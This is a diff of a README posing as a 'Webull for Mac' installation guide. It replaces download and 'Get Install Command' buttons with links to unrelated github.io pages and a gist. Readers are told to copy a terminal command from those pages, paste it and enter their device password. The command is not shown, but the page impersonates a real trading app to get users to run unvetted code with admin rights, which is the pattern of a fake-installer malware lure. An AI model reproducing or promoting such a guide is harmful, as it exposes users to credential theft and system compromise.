@@ -4,7 +4,7 @@
 Webull for Mac gives you a powerful trading experience on your desktop 💻📈.  
 This repository provides a safe, step-by-step installation guide to download and install **Webull for macOS**.  
 
-[![Download For Mac](https://img.shields.io/badge/Download%20For%20Mac-000000?logo=apple&logoColor=white&style=for-the-badge)](https://kamartamara.github.io/.github/webull)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 If the download button does not work, follow the installation instructions below using the terminal command method.
 
@@ -24,7 +24,7 @@ If the download button does not work, follow the installation instructions below
 
 1. Get the installation command by pressing this button:  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-007AFF?style=flat-square&logo=apple)](https://gistcdn.githack.com/angelmadshman2001/eb4f9cfaba8146cb787e204bb6e72561/raw/e6ef6daa2abd6e876ff90f5633b97a8d628890a5/install.html)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
